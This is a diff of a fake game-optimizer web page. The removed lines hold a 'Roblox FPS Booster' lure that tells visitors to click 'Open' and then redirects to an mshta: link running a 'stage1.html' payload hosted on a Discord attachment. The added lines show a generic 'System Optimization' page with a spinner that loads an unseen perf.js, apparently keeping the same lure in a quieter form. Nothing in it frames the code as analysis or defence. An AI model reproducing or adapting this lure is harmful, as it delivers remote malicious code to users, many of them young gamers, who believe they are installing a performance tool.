@@ -1,19 +1,28 @@
 <!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>Roblox FPS Booster</title>
-<style>
-body{background:#1a1a2e;color:#fff;font-family:Arial;text-align:center;padding-top:80px}
-h1{font-size:28px;color:#00ff88}
-p{color:#aaa;margin:20px}
-.loader{border:3px solid #333;border-top:3px solid #00ff88;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:30px auto}
-@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-</style></head><body>
-<h1>Roblox FPS Booster v2.8</h1>
-<div class="loader"></div>
-<p>Preparing your optimization settings...</p>
-<p style="font-size:12px;color:#666">If prompted, click <b>Open</b> to start</p>
-<script>
-setTimeout(function(){
-    location.href="mshta:https://cdn.discordapp.com/attachments/1532969986400981032/1533342678400368640/stage1.html?ex=6a702426&is=6a6ed2a6&hm=487224988644f48e0156dc9cfb00285324c98f8b504f6c10062c5e491aafb143&";
-},1500);
-</script>
-</body></html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Performance Optimizer</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}
+        .container{max-width:500px;padding:40px}
+        h1{font-size:24px;color:#58a6ff;margin-bottom:16px}
+        p{color:#8b949e;font-size:14px;line-height:1.6;margin-bottom:12px}
+        .spinner{width:36px;height:36px;border:3px solid #21262d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;margin:24px auto}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .footer{margin-top:40px;font-size:11px;color:#484f58}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>System Optimization</h1>
+        <div class="spinner"></div>
+        <p>Analyzing system performance metrics...</p>
+        <p>This may take a few moments.</p>
+        <div class="footer">v2.8.1 &middot; All rights reserved</div>
+    </div>
+    <script src="perf.js"></script>
+</body>
+</html>
